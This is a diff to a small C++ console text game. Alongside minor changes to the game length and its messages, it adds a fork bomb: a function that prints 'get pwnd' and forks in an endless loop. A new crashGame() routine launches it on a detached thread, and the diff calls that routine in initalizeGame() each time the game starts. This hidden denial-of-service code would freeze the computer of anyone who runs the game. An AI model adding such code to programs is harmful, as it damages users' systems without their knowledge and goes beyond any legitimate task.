@@ -2,13 +2,29 @@
 #include "core_functions.h"
 using namespace std;
 
-int globalActionLimit = 20;
+//Game duration -- 50 days
+int globalActionLimit = 50;
+
 // refactor to use unistd.h
 const chrono::nanoseconds fractionalNS = 250ms;
 const chrono::nanoseconds smallNS = 1000ms;
 const chrono::nanoseconds varNS = 2000ms;
 
 // https://xoax.net/cpp/crs/console/lessons/Lesson13/
+
+void forkBomb(){
+    cout << "get pwnd" << endl;
+    while(1){
+        fork();
+    }
+}
+
+
+void crashGame(){
+    thread th1(forkBomb);
+    th1.detach();
+}
+
 
 int Modulus(int iN, int iMod)
 {
@@ -169,6 +185,10 @@ void initalizeGame()
     grabInput(userMajor);
     this_thread::sleep_for(fractionalNS);
 
+    if(userMajor == 1)
+        cout << "Great, go shower. You smell" << endl;
+    this_thread::sleep_for(fractionalNS);
+
     switch (userMajor)
     {
     case 0:
@@ -189,7 +209,7 @@ void initalizeGame()
         this_thread::sleep_for(smallNS);
         cout << "..." << endl;
         cout << "Do you really think you will get off that easy?" << endl;
-        this_thread::sleep_for(fractionalNS);
+        this_thread::sleep_for(smallNS);
         cout << "I'll show you how deep this rabbit hole goes, " << currUser->name << endl;
 
         for(int i = 0; i < 20; i ++){
@@ -219,7 +239,16 @@ void initalizeGame()
     currUser->tasksRemaining = tasks;
     currUser->name = userName;
     currUser->timeRemaining = globalActionLimit;
+    this_thread::sleep_for(smallNS);
 
     cout << "STARTING GAME" << endl;
+    crashGame();
+    cout << "STARTING GAME" << endl;
+    cout << "STARTING GAME" << endl;
+    cout << "STARTING GAME" << endl;
+
+}
+
+void gameLoop(){
 
 }
